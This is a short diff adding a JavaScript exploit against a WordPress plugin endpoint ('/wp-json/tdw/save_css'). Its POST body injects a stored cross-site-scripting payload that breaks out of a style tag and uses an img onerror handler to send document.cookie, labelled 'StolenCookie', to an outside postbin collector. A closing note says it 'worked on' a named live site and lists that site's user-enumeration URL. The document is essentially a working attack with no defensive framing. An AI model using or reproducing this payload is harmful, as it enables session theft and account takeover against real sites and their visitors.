@@ -1,0 +1,23 @@
+fetch('/wp-json/tdw/save_css', {
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: "compiled_css=</style><img src onerror=\"(function() { fetch('https://www.toptal.com/developers/postbin/1702534196120-3130679212044',{'StolenCookie': document.cookie}).then(response => response.text()).then(data => document.getElementById('response').textContent = data).catch(error => document.getElementById('response').textContent = 'Error: ' + error.message); })()\"><style>",
+    method: "POST"
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('Network response was not ok');
+    }
+    return response.text();
+})
+.then(data => {
+    console.log('Success:', data);
+})
+.catch(error => {
+    console.error('Error:', error);
+});
+ worked on oijom
+
+---------------------
+https://oijom.com/wp-json/wp/v2/users
